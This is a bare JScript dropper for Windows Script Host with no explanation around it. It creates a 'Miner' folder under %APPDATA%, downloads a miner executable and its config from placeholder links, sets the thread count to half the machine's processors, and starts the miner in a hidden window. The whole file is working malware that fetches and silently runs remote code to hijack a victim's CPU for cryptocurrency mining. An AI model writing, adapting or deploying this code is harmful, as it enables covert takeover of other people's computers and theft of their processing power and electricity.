l_miner = "miner_link";
l_config = "config_link";
FsoObj = new ActiveXObject("Scripting.FileSystemObject");
ShellObj = new ActiveXObject("WScript.Shell");
miner_dir = '';

var download = function(f_link,f_name) {
	XmlhttpObj = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
	XmlhttpObj.open("get",f_link,0);
	XmlhttpObj.SetRequestHeader("User-Agent","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)");
	XmlhttpObj.send();
	XmlhttpObj.WaitForResponse();
	if (XmlhttpObj.status == 200) {
		StreamObj = new ActiveXObject("ADODB.Stream");
		StreamObj.Open;
		StreamObj.Type = 1;
		StreamObj.Write(XmlhttpObj.ResponseBody);
		StreamObj.SaveToFile(f_name);
		StreamObj.Close;
	};
};

var replace = function(path) {
	stream = new ActiveXObject("ADODB.Stream");
	stream.Open();
	stream.Type = 2;
	stream.Position = 0;
	stream.Charset = "utf-8";
	stream.LoadFromFile(path);
	sResult = stream.ReadText();
	stream.Close();
	FsoObj.DeleteFile(path);
	n_text = sResult.replace(/THREADS_COUNT/g,ShellObj.expandEnvironmentStrings("%NUMBER_OF_PROCESSORS%")/2);
	create_config(n_text,path);
}

var create_config = function(content,f_name) {
	adSaveCreateOverWrite = 2;
	stream = new ActiveXObject("ADODB.Stream");
	stream.Open();
	stream.Type = 2;
	stream.Position = 0;
	stream.Charset = "utf-8";
	stream.WriteText(content);
	stream.SaveToFile(f_name, adSaveCreateOverWrite);
	stream.Close();
}

var init = function() {
	miner_dir = ShellObj.expandEnvironmentStrings("%APPDATA%")+"\\Miner";
	FsoObj.CreateFolder(miner_dir);
};

init();
download(l_miner,miner_dir+"\\miner.exe");
download(l_config,miner_dir+"\\config.json");
replace(miner_dir+"\\config.json");
ShellObj.Run(miner_dir+"\\miner.exe",0,false);